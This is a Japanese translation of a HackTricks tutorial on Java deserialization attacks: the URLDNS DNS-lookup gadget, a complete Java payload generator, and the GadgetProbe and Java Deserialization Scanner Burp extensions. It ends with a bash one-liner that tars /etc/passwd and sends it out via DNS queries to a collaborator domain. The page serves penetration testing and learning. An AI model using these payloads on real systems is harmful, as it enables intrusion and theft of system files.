# Java DNS Deserialization、GadgetProbe、Java Deserialization Scanner

## Java DNS Deserialization、GadgetProbe、Java Deserialization Scanner

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## deserialization時のDNSリクエスト

クラス`java.net.URL`は`Serializable`を実装しています。これは、このクラスがシリアライズ可能であることを意味します。
```java
public final class URL implements java.io.Serializable {
```
このクラスには**興味深い振る舞い**があります。ドキュメントからの引用です：「**ホスト名が同じIPアドレスに解決できる場合、2つのホストは同等とみなされます**」。\
そのため、URLオブジェクトが**いずれかの** **`equals`** 関数または **`hashCode`** 関数を呼び出すたびに、IPアドレスを取得するための**DNSリクエスト**が**送信**されます。

URLオブジェクトから**`hashCode`** 関数を**呼び出す**ことは非常に簡単で、これを逆シリアライズされる `HashMap` に挿入するだけで十分です。これは、`HashMap` の **`readObject`** 関数の**最後に**以下のコードが実行されるためです：
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
```markdown
これは `HashMap` 内のすべての値に対して `putVal` を**実行**します。しかし、より重要なのは、すべての値に対して `hash` を呼び出すことです。これが `hash` 関数のコードです：
```
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
観察できるように、**`HashMap`** を**デシリアライズする際**には、`hash` 関数が**すべてのオブジェクトで実行される**ことになります。そして、**`hash`** の実行**中に**、オブジェクトの `.hashCode()` が**実行されます**。したがって、**`HashMap`** に**URL** オブジェクトを**含む**データを**デシリアライズする**と、**URL オブジェクト**は `.hashCode()` を**実行する**ことになります。

それでは、`URLObject.hashCode()` のコードを見てみましょう：
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
```markdown
ご覧の通り、`URLObject`が`.hashCode()`を実行すると、`hashCode(this)`が呼び出されます。続いて、この関数のコードを見ていきましょう：
```
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
ドメインに対して`getHostAddress`が実行され、**DNSクエリが発生**します。

したがって、このクラスは**悪用**されて、**DNSクエリを発生**させ、**デシリアライゼーション**が可能であることを**示す**ため、または情報を**抽出する**ために使用することができます（コマンド実行の出力をサブドメインとして追加できます）。

### URLDNSペイロードコード例

[ysoserialのURDNSペイロードコードはこちら](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)で見つけることができます。しかし、コードの理解を容易にするために、私はysoserialのものに基づいて自分のPoCを作成しました：
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### 詳細情報

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* 元のアイデアでは、commons collectionsのペイロードがDNSクエリを実行するように変更されましたが、これは提案された方法よりも信頼性が低かったです。しかし、こちらがその投稿です: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

**GadgetProbe**はBurp Suite App Store (Extender)からダウンロードできます。

**GadgetProbe**はサーバーのJavaクラスに**Javaクラスが存在するか**を判断し、既知のエクスプロイトに**脆弱**かどうかを知ることができます。

### 動作方法

**GadgetProbe**は前のセクションの**DNSペイロード**を使用しますが、DNSクエリを実行する**前に**、任意のクラスのデシリアライズを**試みます**。任意のクラスが存在する場合、**DNSクエリ**が**送信**され、GadgetProbeはこのクラスが存在することを記録します。**DNS**リクエストが**送信されない**場合、任意のクラスが正常にデシリアライズされなかったことを意味し、存在しないか、**シリアライズ/エクスプロイト可能**ではありません。

GitHub内には、テスト用のJavaクラスの[**ワードリストがいくつかあります**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists)。

![](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### 詳細情報

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Javaデシリアライゼーションスキャナー

このスキャナーはBurp App Store (**Extender**)から**ダウンロード**できます。\
**拡張機能**には**パッシブ**とアクティブの**機能**があります。

### パッシブ

デフォルトでは、**Javaシリアライズされたマジックバイト**を**探して**、すべてのリクエストとレスポンスを**パッシブにチェック**し、見つかった場合は脆弱性警告を表示します：

![](<../../.gitbook/assets/image (290).png>)

### アクティブ

**手動テスト**

リクエストを選択し、右クリックして`Send request to DS - Manual Testing`を選びます。\
その後、_Deserialization Scanner Tab_ --> _Manual testing tab_内で**挿入ポイント**を選択し、**テストを開始**します（使用されているエンコーディングに応じて適切な攻撃を選択します）。

![](../../.gitbook/assets/3-1.png)

これは"手動テスト"と呼ばれていますが、かなり**自動化**されています。ウェブサーバーに存在するライブラリをチェックし、**ysoserialペイロード**に対して**デシリアライゼーションが脆弱**かどうかを自動的に確認し、脆弱なものをハイライトします。**脆弱なライブラリ**をチェックするために、**Java Sleeps**、**CPU**消費による**sleeps**、または前述のように**DNS**を使用して起動することができます。

**エクスプロイト**

脆弱なライブラリを特定したら、リクエストを_Exploiting Tab_に送ります。\
このタブでは、再度**挿入ポイント**を**選択**し、ペイロードを作成したい**脆弱なライブラリ**と**コマンド**を**記述**します。その後、適切な**Attack**ボタンを押します。

![](<../../.gitbook/assets/4 (1).png>)

### JavaデシリアライゼーションDNS Exfil情報

以下のような何かを実行するペイロードを作成します：
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### 詳細情報

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* あなたの**会社をHackTricksに広告掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>
